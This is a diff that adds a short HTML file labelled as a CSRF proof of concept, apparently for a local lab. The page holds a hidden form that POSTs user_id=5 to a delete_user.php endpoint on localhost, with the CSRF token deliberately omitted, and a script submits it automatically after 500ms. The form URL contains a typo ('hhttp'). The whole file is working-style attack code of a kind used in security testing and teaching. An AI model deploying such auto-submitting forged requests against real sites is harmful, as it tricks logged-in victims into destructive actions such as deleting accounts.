@@ -1,0 +1,16 @@
+<!-- attack.html -->
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC</title></head>
+<body>
+  <h3>CSRF PoC - auto submit</h3>
+  <form id="atk" action="hhttp://localhost:8090/delete_user.php" method="POST">
+    <input type="hidden" name="user_id" value="5">
+    <!-- intentionally no csrf_token -->
+  </form>
+  <script>
+    // auto submit after 500ms so you can switch tabs
+    setTimeout(()=>document.getElementById('atk').submit(), 500);
+  </script>
+</body>
+</html>
